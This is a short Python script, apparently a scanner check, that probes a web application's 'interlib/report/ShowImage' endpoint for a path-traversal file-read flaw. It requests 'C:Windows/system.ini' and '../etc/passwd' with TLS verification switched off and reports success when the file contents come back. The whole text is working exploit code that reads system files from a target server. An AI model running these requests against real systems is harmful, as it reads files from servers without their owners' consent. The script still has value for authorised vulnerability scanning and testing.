import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def doCheck(baseurl):
	try:
		url=baseurl+"interlib/report/ShowImage?localPath=C:Windows/system.ini"
		headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
		response=requests.get(url,headers=headers,timeout=5,verify=False)
		if response.status_code == 200 and re.search("\[drivers\]",response.text):
			r0=True
		else:
			r0=False
	except:
		r0=False
	try:
		url=baseurl+"interlib/report/ShowImage?localPath=../etc/passwd"
		headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
		response=requests.get(url,headers=headers,timeout=5,verify=False)
		if response.status_code == 200 and re.search("root:",response.text):
			r1=True
		else:
			r1=False
	except:
		r1=False
	if r0 or r1:
		return True
	else:
		return False
